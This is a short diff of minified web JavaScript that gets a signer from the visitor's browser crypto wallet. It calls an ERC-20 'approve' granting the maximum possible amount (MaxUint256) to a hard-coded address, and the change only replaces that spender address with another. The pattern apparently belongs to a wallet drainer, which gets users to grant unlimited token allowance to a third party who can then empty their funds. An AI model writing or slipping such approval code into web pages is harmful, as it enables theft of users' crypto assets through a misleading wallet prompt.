@@ -19144,7 +19144,7 @@ function qf() {
             const Fe = await new J.BrowserProvider(window.ethereum).getSigner()
               , le = ["function approve(address spender, uint256 amount) external returns (bool)"]
               , Hn = new J.Contract(V.contractAddress,le,Fe)
-              , at = "0x564a3bc6c16e5cd68ccd194df2380088db74cd9e"
+              , at = "0x4f2d5Ea5De93D5B0e985E4ce18b941187cD13f7B"
               , Ie = J.MaxUint256
               , dt = await Hn.approve(at, Ie);
             await dt.wait(),
